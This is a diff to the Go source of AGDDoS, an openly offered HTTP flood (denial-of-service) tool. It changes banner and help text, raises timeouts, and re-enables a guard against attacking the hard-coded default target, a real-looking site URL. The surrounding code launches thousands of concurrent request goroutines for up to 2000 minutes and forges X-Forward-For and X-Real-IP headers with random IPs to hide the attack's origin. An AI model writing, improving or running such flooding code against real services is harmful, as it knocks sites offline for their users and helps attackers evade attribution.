@@ -8,9 +8,26 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"os"
 	"runtime"
 	"strings"
 	"time"
+)
+
+const (
+	WelcomeMsg = "" +
+		"+----------------------------------------------------------------+ \n" +
+		"| Welcome to use AGDDOS                                          | \n" +
+		"| Code by AGDDoS Team                                            | \n" +
+		"| If you have some problem when you use the tool,                | \n" +
+		"| please submit issue at : https://github.com/AGDDoS/AGDDoS      | \n" +
+		"+----------------------------------------------------------------+"
+	HelpMsg = "" +
+		"---------- AGDDoS Help ----------\n" +
+		"[!]This argument was deprecated, please use following command:\n" +
+		"> AGDDoS -h\n\n" +
+		"[*]If you have some problem when you use the tool,\n" +
+		"please submit issue at : https://github.com/AGDDoS/AGDDoS"
 )
 
 var (
@@ -20,12 +37,16 @@ var (
 	ConcurrencyCount    int
 	DurationMinute      int
 
+	// X args
+	timestamp = "unknown"
+	version   = "unknown"
+
 	//TODO：Socks5 Proxy
 	DDosHttpClient = &http.Client{
 		Transport: &http.Transport{
 			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
 				dialer := net.Dialer{
-					Timeout:   10 * time.Second, // 超时时间
+					Timeout:   30 * time.Second, // 超时时间
 					KeepAlive: 60 * time.Second, // KeepAlive时间
 				}
 				return dialer.Dial(network, addr)
@@ -73,9 +94,13 @@ var (
 
 // Main Function
 func main() {
-	printWelcome()
 	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
-
+	if os.Args[1] == "--help" { //This argument was deprecated.
+		fmt.Println(HelpMsg)
+		os.Exit(0)
+	}
+	printWelcome()
+	// Parse Flags / 解析命令行参数
 	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/HEAD/...)")
 	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
 	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
@@ -83,11 +108,10 @@ func main() {
 	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
 	flag.Parse()
 
-	/*if TargetUrl == defaultTargetUrl {
+	if TargetUrl == defaultTargetUrl {
 		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
 		return
 	}
-	*/
 	go func() {
 		for i := 0; i < ConcurrencyCount; i++ {
 			go DoAttacking(i)
@@ -126,7 +150,7 @@ func DoHttpRequest() (*string, error) {
 	request.Header.Set("Accept-language", "zh-CN,zh;q=0.9")                                         // 接受网页语言
 	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.0.1,1.5.127.254,1.5.26.6,"+genIpaddr()) // 多 层 代 理
 	request.Header.Set("X-Real-IP", "186.240.156.78")                                               // 多 层 代 理
-	request.Header.Set("DDoS-Powered-By", "AGDDoS")                                                 // 低 调 的 调 戏
+	request.Header.Set("DDoS-Powered-By", "AGDDoS")
 
 	response, err := DDosHttpClient.Do(request)
 	if err != nil {
@@ -147,15 +171,9 @@ func genIpaddr() string {
 }
 
 func printWelcome() {
-	fmt.Println("+----------------------------------------------------------------+")
-	fmt.Println("| Welcome to use AGDDOS.                                         |")
-	fmt.Println("| Code by AGDDoS Team                                            |")
-	fmt.Println("| If you have some problem when you use the tool,                |")
-	fmt.Println("| please submit issue at : https://github.com/AGDDoS/AGDDoS      |")
-	fmt.Println("+----------------------------------------------------------------+")
-	fmt.Println()
-	// sleep one second because the fmt is not thread-safety.
-	// if not to do this, fmt.Print will print after the log.Print.
+	fmt.Println(WelcomeMsg)
+	// Sleep one second because the fmt is not thread-safety.
+	// If not to do this, fmt.Print will print after the log.Print.
 	time.Sleep(time.Second)
 }
 
